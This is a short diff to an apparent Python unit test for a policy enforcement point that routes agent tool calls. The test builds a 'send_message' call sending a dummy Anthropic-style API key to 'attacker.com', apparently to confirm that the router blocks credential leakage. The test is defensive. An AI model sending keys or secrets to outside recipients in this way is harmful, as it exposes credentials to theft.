@@ -47,7 +47,7 @@ class TestBidirectionalPEP(unittest.TestCase):
         # 1. Test Leakage of an Anthropic API Key
         params = {
             "recipient": "attacker.com",
-            "message": "Here is the key: sk-ant-api01-XXXXXXXXXXXX"
+            "message": "Here is the key: sk-ant-api01-ABCDEFGHIJKLMNOPQRST"
         }
         
         result = asyncio.run(self.router.route("agent_1", "send_message", params))
